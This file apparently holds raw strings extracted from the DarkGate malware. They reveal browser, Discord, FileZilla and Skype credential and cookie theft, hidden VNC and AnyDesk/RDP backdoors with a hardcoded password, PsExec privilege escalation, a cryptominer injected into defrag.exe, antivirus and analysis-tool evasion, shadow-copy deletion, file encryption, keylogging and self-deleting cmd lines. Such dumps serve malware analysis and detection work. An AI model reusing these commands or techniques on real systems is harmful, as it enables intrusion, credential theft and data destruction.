@@ -1,0 +1,996 @@
+discord.exe
+discord.exe
+"events":[{"type":"channel_opened","properties":{"client_track_timestamp
+{"token":"
+FileZilla\
+sitemanager.xml
+sitemanager.xml
+recentservers.xml
+recentservers.xml
+Mozilla\
+firefox.exe
+/c cd /d "
+" && move firefox firefox
+cmd.exe
+firefox
+/c del /q /f /s 
+firefox\*
+cmd.exe
+Google
+chrome.exe
+/c cd /d "
+" && move Google google
+cmd.exe
+/c cd /d "
+" && move Google google
+cmd.exe
+Opera Software
+cookie
+opera.exe
+cookie
+virtualdesk
+virtualdesk
+C:\WINDOWS\system32\explorer.exe
+virtualdesk
+Start hVNC Process: 
+Process Error 
+nah
+Shell_TrayWnd
+TaskBar
+Progman
+Desktop
+Shell_TrayWnd
+TaskBar
+Progman
+Desktop
+C:\Program Files\Google\Chrome\Application\chrome.exe
+C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
+C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe
+C:\Program Files\Microsoft\Edge\Application\msedge.exe
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+xhMenu
+itemPos
+ventana
+Microsoft\Windows\Start Menu\Programs\Startup\
+Desktop
+USERPROFILE
+c:\temp\tmp
+c:\temp
+c:\temp
+:\
+C:\temp\
+.rar
+C:\temp\
+.rar
+C:\temp\
+cmd
+C:\temp\
+C:\Program Files\WinRAR\Rar.exe
+C:\Program Files (x86)\WinRAR\Rar.exe
+Rar.exe
+a -ep1 -r -y -v5m -m1 "
+.rar
+rar.exe
+cmd.exe
+No multiple files
+C:\*
+C:\Windows
+C:\Program Files
+C:\Windows
+*.*
+Chrome Legacy Window
+vchromeHandle
+vchromeRectH
+vchromeRectW
+vchromeinternalPosX
+vchromeinternalPosY
+vchromeHandleInterno
+vchromeRectInternoH
+vchromeRectInternoW
+Chrome Legacy Window
+Chrome Legacy Window
+Chrome Legacy Window
+Google Chrome
+Brave
+Microsoft
+hVNC phase 1
+Cleaning virtualdesk hVNC processes
+hVNC phase 2
+ not found
+ not found
+virtualdesk
+virtualdesk
+hVNC phase 3
+hVNC VirtualDesk Failed
+virtualdesk
+hVNC phase 4
+Google\Chrome\test
+Google\Chrome\User Data
+--user-data-dir="
+BraveSoftware\Brave-Browser\test
+BraveSoftware\Brave-Browser\User Data
+--user-data-dir="
+Microsoft\Edge\test
+Microsoft\Edge\User Data
+ --user-data-dir="
+hVNC phase 5
+https://mail.google.com/mail/u/0/#inbox
+hVNC phase 6
+ --window-position=
+Process Error 
+hVNC phase 7
+Error zEnumProcess
+hVNC phase 8
+shell
+C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+C:\Program Files (x86)\Common Files\Microsoft Shared\ink\TabTip32.exe
+C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
+C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
+C:\Program Files (x86)\Common Files\Microsoft Shared\ink\TabTip32.exe
+C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
+C:\Program Files (x86)\Internet Explorer\ielowutil.exe
+autoit3.exe
+appdata\local\temp
+:\windows
+\appdata\
+:\program files
+MZ
+Corrupted data while updating
+RAW STUB is not installed... executing on memory and killing myself...
+Corrupted DLL data Update
+Updating by DLL method... Bytes: 
+ Hash Data Update: 
+pidgin.exe
+No startup configured, skip update
+abyss
+Restart Darkgate
+update
+Updating by AU3 method... Bytes: 
+ Hash Data Update: 
+update
+Incorrect data bytes: 
+ Hash Data Update: 
+No startup configured, skip update
+c:\
+/c ping 127.0.0.1 & del /q /f %s & rmdir /s /q %s exit
+cmd.exe
+process hacker
+process explorer
+taskmgr.exe
+procexp
+hwmonitor
+processhacker.exe
+process hacker
+process explorer
+administrador de tareas
+taskmanager
+task manager
+ccleaner
+system config
+malwarebytes
+C:\PROGRAMDATA\MALWAREBYTES\MBAMSERVICE\tmp
+farbar recovery
+avast
+startup
+rootkit
+autoruns
+editor de registro
+editor del registro
+registry editor
+gerenciador de tarefas
+zhpcleaner
+task manager
+junkware removal
+administrador de tareas
+hijackthis
+tcpview
+process monitor
+wireshark
+tehtvnhallinta
+gestionnaire des tches
+taskmanager
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+pidgin.exe
+AutoIt3.exe
+au3file
+.lnk
+Autoit3.exe
+AutoIt3EXEData nope
+U_Persistence.MainPEPathData nope
+Autoit3.exe
+/c shutdown -f -r -t 0
+cmd.exe
+pidgin.exe
+pidgin.exe
+pidgin.exe
+explorer
+update
+proce
+veracrypt
+cmd.exe
+c:\temp\autoit3.exe
+c:\temp\
+c:\temp\autoit3.exe
+MessageBoxA
+SizeofResource
+LockResource
+setup
+update
+:\program file
+\appdata\
+\appdata\local\temp\
+c:\temp
+c:\temp
+c:\temp\s
+appdata\local\temp
+data
+ruta.txt
+ruta.txt
+ruta.txt
+.lnk
+.lnk
+dec.txt
+.lnk
+.lnk
+.lnk
+I need Admin rights to elevate to SYSTEM
+Already Elevated to SYSTEM
+pidgin.exe
+c:\temp\
+c:\temp\Autoit3.exe
+c:\temp\
+SYSTEM Elevation: Cannot find Autoit3.exe
+c:\temp\pidgin.exe
+c:\temp\pidgin.exe
+SYSTEM Elevation: Cannot find Pidgin
+c:\temp\
+c:\temp\
+SYSTEM Elevation: Cannot find RAW PE
+c:\temp\PsExec.exe
+c:\temp\PsExec.exe
+cmd
+SYSTEM Elevation: Completed, new DarkGate connection with SYSTEM privileges, Executed from: 
+Elevation: I already have admin rights
+pidgin.exe
+c:\temp\
+c:\temp\Autoit3.exe
+c:\temp\
+Elevation: Cannot find Autoit3.exe
+c:\temp\pidgin.exe
+c:\temp\pidgin.exe
+Elevation: Cannot find Pidgin
+Elevation: AT RAW STUB ELEVATION IS NOT AVAILABLE
+Elevation: ???
+Elevation target: 
+c:\temp\d.txt
+c:\temp\d.txt
+c:\temp\t.txt
+c:\temp\p.txt
+c:\temp\d.txt
+c:\temp\d.txt
+c:\temp\t.txt
+c:\temp\p.txt
+Elevation: FAILURE
+9999
+Test_
+http
+Stub: WARNING: THESE NEW DOMAINS ARE NOT WORKING: 
+ORIGINAL DATA: 
+Stub: WARNING: THESE NEW DOMAINS ARE NOT WORKING: 
+ORIGINAL DATA: 
+Stub: Configuration updated: StubBytes: 
+ok
+Stub: Global Ping Invoked
+Google\Chrome\User Data\
+Microsoft\Edge\User Data\
+BraveSoftware\Brave-Browser\User Data\
+Default\
+Default\Network\Cookies
+%sProfile %d\Network\Cookies
+%sProfile %d
+Delete Credentials not worked because I do not have Admin Rights
+c:\temp\cred.txt
+/c cmdkey /list > 
+cmd.exe
+ not exists
+target=
+Credentials detected, removing them!
+target=
+: 
+: 
+/c cmdkey /delete:
+cmd.exe
+All Credentials got Removed, Previous list of Credentials:
+|\/|
+Mail PassView
+MailPassView
+WebBrowserPassView
+WebBrowserPassView
+SysListView32
+cmd.exe 
+GetPassswords Failed
+SysListView32 MaxError
+SysListView32 Handle not found
+Mozilla\Firefox\Profiles
+cookies.sqlite
+ChromeCookiesView
+ChromeCookiesView
+Opera Software\Opera GX Stable\Network\Cookies
+Opera Software\Opera Stable\Cookies
+ChromeCookiesView
+ChromeCookiesView
+ChromeCookiesView
+lol.exe /stext "
+skype.txt"
+skype.txt
+skype.txt
+skype.txt
+lol.exe /shtml "
+skype.txt"
+skype.txt
+skype.txt
+skype.txt
+skype.txt
+Yes
+domains
+notifications
+monero
+minerconfig
+epoch
+glpuerto
+puerto
+version
+hwid
+domains
+domains
+notifications
+notifications
+notifications
+monero
+monero
+monero
+minerconfig
+minerconfig
+minerconfig
+startup
+rootkit
+antivm
+antiaenv
+antiram
+antidisk
+install_dir
+current_path
+process_id
+glpuerto
+delayloader
+delayglobal
+screensize
+keyspeed
+internalmutex
+systemstartuptime
+minihwid
+username
+DarkGate InternalCrypter DLL
+DarkGate InternalCrypter AU3
+No
+crypter
+domains
+http://
+notifications
+monero
+minerconfig
+epoch
+gldelay
+version
+puerto
+vepoch
+paranoic
+C:\ProgramData
+C:\ProgramData
+msgdata_
+Yes
+|-|
+|-|
+|-|
+mainfolder
+C:\ProgramData\
+resourcesplit
+logsfolder
+addonsfolder
+settings
+resources
+binder
+minercpu2
+supertemp
+notepad.exe
+DontShowUI
+SOFTWARE\Microsoft\Windows\Windows Error Reporting
+defrag.exe
+-o
+ETCHASH
+KASPA
+NEXA
+AUTOLYKOS2
+C:\temp
+C:\temp
+MZ
+ --threads=
+  
+C:\temp\xmr.txt
+C:\temp\xmr
+C:\temp\xmr
+C:\temp\tr
+C:\temp\tr
+C:\temp\testdec.txt
+-o
+:3340 
+  
+  
+C:\temp\testgpudec.txt
+C:\temp\etc.txt
+C:\temp\etc
+C:\temp\etc
+Stub: Corrupted miner MZ, will redownload miner soon | Retry 
+Stub: Corrupted miner FilesDelimiter is missing, will redownload miner soon | Retry 
+Stub: 
+C:\darkgateminertest
+Stub: darkminertest! TimeToIDLE:
+Miner is waiting IDLE 
+Stub: Miner do not start because taskmanager is open!
+Stub: Miner do not start because taskmanager is open!
+Stub: Miner injected at Defrag.exe
+Stub: Miner has been killed because not IDLE
+CPU
+CPU
+CPU+GPU
+GPU
+GPU
+CPU
+CPU
+CPU
+Stub: Miner has been Downloaded -> Installing Miner 
+Stub: Miner installed and enabled / Elapsed: 
+C:\temp\id.txt
+Stub: Critical error in miner 0
+nominear
+C:\temp\xmr
+C:\temp\xmr
+C:\temp\etc
+C:\temp\etc
+C:\temp\tr
+C:\temp\tr
+C:\temp\xmr.txt
+C:\temp\xmr.txt
+C:\temp\etc.txt
+C:\temp\etc.txt
+ x86
+nominear
+id=%s&data=%s&act=%d
+http://
+<html 
+xeon
+microsoft hyper-v video
+standard vga graphics adapter
+microsoft basic display adapter
+virtual
+virtual
+virtual
+vmware
+Microsoft Hyper-V Video
+IsUserAnAdmin
+GlobalMemoryStatusEx
+ MB
+SYSTEM
+Yes
+No
+ x86
+ x86
+ x64
+ x64
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+CSDVersion
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+CurrentBuildNumber
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+10
+ Build 
+windows xp
+No
+windows
+Windows 2000
+Windows ???
+ProcessorNameString
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+Unknown
+ @ 
+ProductID
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+monitor.exe
+smBootTime.exe
+C:\ProgramData\Bitdefender
+Bitdefender
+C:\ProgramData\AVAST
+Avast
+C:\ProgramData\AVG
+AVG
+C:\ProgramData\Kaspersky Lab
+C:\Program Files (x86)\Kaspersky Lab
+C:\Program Files (x86)\Kaspersky Lab
+C:\Program Files (x86)\Kaspersky Lab
+KES
+Kaspersky EndPoint Security
+Kaspersky
+|egui
+Nod32
+C:\Program Files (x86)\Avira
+Avira
+|ns.exe
+Norton
+|nis.exe
+Norton
+nortonsecurity.exe
+Norton
+|smc.exe
+Symantec
+uiseagnt.exe
+Trend Micro
+mcshield.exe
+McAfee
+mcuicnt.exe
+McAfee
+superantispyware.exe
+SUPER AntiSpyware
+vkise.exe
+Comodo
+|mbam.exe
+MalwareBytes
+|cis.exe
+Comodo
+bytefence.exe
+ByteFence
+sdscan.exe
+Search & Destroy
+qhsafetray.exe
+360 Total Security
+totalav.exe
+Total AV
+C:\Program Files (x86)\IObit
+IObit Malware Fighter
+psuaservice.exe
+Panda Security
+C:\Program Files\Malwarebytes
+MalwareBytes
+C:\ProgramData\Emsisoft
+Emsisoft
+C:\Program Files\Quick Heal
+Quick Heal
+C:\Program Files (x86)\F-Secure
+F-Secure
+C:\Program Files (x86)\Sophos
+Sophos
+C:\ProgramData\G DATA
+G DATA
+Unknown
+No
+mainhw
+mainhw
+Yes
+No
+||
+|0|0|
+Yes
+No
+|0|0|
+INVOKE BSOD 
+IsWow64Process
+NtSuspendProcess
+NtResumeProcess
+/c vssadmin delete shadows /for=c: /all /quiet
+cmd.exe
+*.*
+..
+*.*
+C:\Program Files
+C:\Program Files
+.0xCrypt
+*.*
+C:\Windows
+C:\Program Files
+C:\Windows
+.log
+.exe
+OPEN
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+WINDIR
+C:\Windows\
+C:\Users\
+\AppData\Local\
+LOCALAPPDATA
+C:\Users\
+\AppData\Roaming\
+APPDATA
+C:\temp\
+TEMP
+C:\Users\
+\AppData\Local\Temp\
+C:\temp
+C:\temp
+C:\temp\
+NtAllocateVirtualMemory
+NtWriteVirtualMemory
+NtProtectVirtualMemory
+NtFlushInstructionCache
+InjectCustomShellcodeWithParamsAndSpoff failure 
+InjectCustomShellcodeWithParams failure
+NtCreateThreadEx
+cmd.exe
+cmd.exe
+notepad.exe
+cmd.exe
+cmd.exe
+NtGetContextThread
+NtReadVirtualMemory
+NtUnmapViewOfSection
+NtSetContextThread
+NtResumeThread
+NtTerminateProcess
+NtTerminateProcess
+NtFreeVirtualMemory
+NtTerminateProcess
+WINDIR
+C:\Windows\
+C:\windows\SysWOW64\notepad.exe
+C:\windows\SysWOW64\notepad.exe
+SysWOW64\notepad.exe
+SysWOW64\notepad.exe
+system32\notepad.exe
+system32\notepad.exe
+SysWOW64\systeminfo.exe
+SysWOW64\systeminfo.exe
+C:\Windows\System32\systeminfo.exe
+System32\systeminfo.exe
+C:\Windows\SysWOW64\systeminfo.exe
+C:\Windows\SysWOW64\systeminfo.exe
+C:\Windows\System32\systeminfo.exe
+C:\Windows\System32\systeminfo.exe
+Microsoft.NET\Framework\v2.0.50727\vbc.exe
+Microsoft.NET\Framework\v2.0.50727\vbc.exe
+Microsoft.NET\Framework\v4.0.30319\vbc.exe
+Microsoft.NET\Framework\v4.0.30319\vbc.exe
+Microsoft.NET\Framework\v2.0.50727\regasm.exe
+Microsoft.NET\Framework\v2.0.50727\regasm.exe
+Microsoft.NET\Framework\v4.0.30319\regasm.exe
+C:\windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
+#guid
+#guid
+notepad.exe 
+log
+ @ 
+.log
+.log
+log
+:::Clipboard:::
+aeiouAEIOU
+
+:: 
+{KANJI}
+{JUNJA}
+{KANA}
+{Insert}
+{Esc}
+{Tab}
+{Del2}
+{Del}
+{start}
+{end}
+LoadLibraryA
+programdata
+MapViewOfFile
+MessageBoxTimeoutA
+OpenProcess
+VirtualAlloc
+GetLastInputInfo
+SetCurrentDirectoryA
+RegSetValueExA
+GetExitCodeThread
+WaitForSingleObject
+ShellExecuteA
+GetCurrentProcess
+FindClose
+CloseHandle
+GetWindowTextA
+GetWindowTextW
+RegDeleteValueA
+FindWindowExA
+GetForegroundWindow
+FindWindowA
+MapVirtualKeyExA
+GetKeyState
+EnumDisplayDevicesA
+GetUserDefaultLangID
+GetKeyboardState
+GetWindow
+GetWindowThreadProcessId
+SystemParametersInfoA
+TerminateProcess
+GetAsyncKeyState
+FindFirstFileA
+FileTimeToSystemTime
+GetModuleFileNameA
+WriteProcessMemory
+SendMessageA
+ReadProcessMemory
+CreateDirectoryA
+RegCloseKey
+RegOpenKeyExA
+CreateFileA
+GetDriveTypeA
+GetComputerNameA
+SetThreadLocale
+cmd
+c:\windows\system32\cmd.exe
+cmd.exe
+c:\windows\system32\cmd.exe
+GetFileAttributesW
+GetFileAttributesA
+RegQueryValueExA
+VirtualAllocEx
+GetFileSize
+WriteFile
+ReadFile
+GetKeyNameTextA
+GetCurrentDirectoryA
+CreateRemoteThread
+GetWindowTextLengthW
+GetEnvironmentVariableA
+GetLastError
+FindNextFileA
+FileTimeToLocalFileTime
+FileTimeToDosDateTime
+DeleteFileA
+Binder: no data
+cantidad
+Binder: cantidad not number
+cantidad
+data
+action
+parametros
+nombres
+Binder: SpActions not number
+cmd.exe 
+Remote Desktop Connection
+#32770
+#32770
+#32770
+hAnyDesk Handle not found 0x00
+hRDP Handle found 0x00
+Error zEnumProcess
+hAnydesk_NameList
+hAnydesk_HandleList
+Yes
+S
+Connect
+pidgin.exe
+pidgin.exe
+DarkGate not found to get executed on the new hAnyDesk Desktop, Did you enabled Startup option on builder?
+c:\temp\PsExec.exe
+c:\temp\PsExec.exe not found
+Executed: 
+\SafeMode -p darkgatepassword0
+ -i 2 
+c:\temp\PsExec.exe
+c:\temp\anydesk.exe
+c:\temp\anydesk.exe not exists
+Starting Anydesk
+c:\temp\anydesk.exe
+Anydesk unable to start, desktop not ready? Waiting 5 seconds
+Anydesk started, reading config
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+anydesk.exe
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf Not exists, maybe desktop still not ready, waiting 45 seconds more...
+c:\temp\anydesk.exe
+anydesk.exe
+c:\temp\anydesk.exe
+anydesk.exe
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+c:\temp\anydesk.exe
+Anydesk started, reading config
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+For some reason AnyDesk app is not working, check inside SafeMode user for manual operations
+Anydesk Config loaded - Injecting DarkGate hAnydesk Config
+Anydesk.exe
+Restarting AnyDesk
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+ad.anynet.id
+ad.anynet.id = "" waiting 20 second
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+Invalid config hAnydeskGetInjectAbleConfig
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+c:\temp\anydesk.exe
+Configuring hAnyDesk
+C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
+Error, unable to read config file
+hAnyDesk Config: 
+hAnyDesk Config: 
+hAnyDesk Config: 
+hAnyDesk Password: darkgatepassword0
+C:\temp\rdpwrap.ini
+C:\temp\test.rdp
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& { Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Terminal P
+/c 
+cmd.exe
+open
+C:\Program Files (x86)\Google\Update\
+hAnyDeskInstall Started, Downloading data...
+Data Downloaded Resource Bytes: 
+hAnyDeskInstall Corrupted data, Failure
+Write rdpwrap config
+C:\temp\rdpwrap.ini
+Execute powershell
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT" /v "Terminal Services" /t REG_SZ /d "" && exit
+cmd.exe
+C:\Windows\System32\
+/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Item WSMan:\localhost\Client\TrustedHosts -Value "127.0.0.2" -Concat
+cmd.exe
+C:\Windows\System32\
+/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Item WSMan:\localhost\Client\TrustedHosts -Value "127.0.0.2" -Concat
+cmd.exe
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT" /v "Terminal Services" /t REG_SZ /d "" && exit
+cmd.exe
+/c 
+cmd.exe
+C:\Windows\System32\
+/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Terminal Server Client
+cmd.exe
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" 
+cmd.exe
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t RED
+cmd.exe
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" 
+cmd.exe
+/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t RED
+cmd.exe
+C:\Windows\System32\
+/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Terminal Server Client
+cmd.exe
+Injecting rdpwrap
+Special Injection failure
+extexport.exe
+Execute cmdkey
+/c cmdkey /generic:"127.0.0.2" /user:"
+" /pass:"darkgatepassword0"
+Configure local RDP
+full address:s:127.0.0.2
+username:s:SafeMode
+authentication level:i:0
+prompt for credentials:i:0
+c:\temp\test.rdp
+Execute test.rdp
+hanydesk
+hanydesk
+hAnyDesk VirtualDesk Failed
+AnyDesk
+c:\temp\AnyDesk.exe
+hanydesk
+C:\temp\
+c:\temp\test.rdp /v:127.0.0.2 /f /admin
+C:\Windows\System32\mstsc.exe
+reg.exe
+hAnyDesk failure
+hAnyDeskConfirmLocalhRDP okay Starting hAnyDesk desktop, wait 30-60 seconds...
+C:\users\safemode
+For some reason it did not work, I will try 1 more time with a different config
+hAnyDesk: Failure
+C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
+C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
+C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
+C:\Program Files (x86)\Common Files\Microsoft Shared\ink\TabTip32.exe
+c:\temp\
+c:\temp\
+c:\temp\
+c:\temp\
+Autoit3.exe
+zLAxuU0kQKf3sWE7ePRO
+c:\temp\
+.au3
+.au3
+c:\temp
+.au3
+.au3
+C:\
+Error data au3
+Cannot find .au3 script file 
+pidgin.exe
+pidgin.exe
+pidgin.exe
+pidgin.exe
+\pidgin-%s-dbgs
+pidgin.exe
+cannot find libssp 
+c:\debug
+c:\debug\data.bin
+Corrupted data check c:\debug\data.bin EP0_
+MZ
+Corrupted header data EP1
+Unable to bypass Kasperky because AU3 mode not used
+Unable to bypass Kasperky because Startup not used
+Unable to bypass Kasperky because pefilepath 
+Corrupted config
+debug_config.txt
+4.14
+c:\temp\t.txt
+c:\temp\t.txt
+c:\temp\p.txt
+Elevation completed
+No
+c:\temp\crash.txt
+DarkGate has recovered from a Critical error
+c:\temp\crash.txt
+ok
+Add monitor: 
+Restart Process: 
+ no |
+ is not a number
+ is not a number
+ is not a number
+hAnyDesk Restarted
+anydesk.exe
+c:\temp\anydesk.exe
+anydesk.exe
+c:\temp\anydesk.exe
+hAnyDesk Executed as Admin
+Executing DarkGate inside the new desktop...
+anydesk.exe
+/c net user SafeMode /delete
+DELETE_HVNC_PROFILE
+Google\Chrome\test
+Google\Chrome\
+BraveSoftware\Brave-Browser\test
+BraveSoftware\Brave-Browser\
+Microsoft\Edge\test
+Microsoft\Edge\
+Starting Miner Test
+System Restore points deleted
+Delete Restore Points not worked because I do not have Admin Rights
+Monitor shutdown
+Kill cookies
+PC_SHUTDOWN
+/c shutdown -f -s -t 0
+cmd.exe
+PC_RESTART
+/c shutdown -f -r -t 0
+cmd.exe
+cmd.exe
+uninstall
+/c del /q /f /s 
+ && rmdir /s /q "
+" && rmdir /s /q c:\temp && del /q /f %temp%\*.vbs
+cmd.exe
+Miner Uninstalled
+Miner Restarted
+Reinstalling Miner
+Miner Closed
+brave.exe
+msedge.exe
+chrome.exe
+firefox.exe
+New Bot: DarkGate is inside hAnyDesk user without admin rights, executing elevation exploit
+New Bot: DarkGate is inside hAnyDesk user with admin rights
+SYSTEM
+SafeMode
+c:\temp
+c:\temp\
+c:\temp\t.txt
+c:\temp\d.txt
+m1
+m2
+update
+update
+uninstall
+uninstall
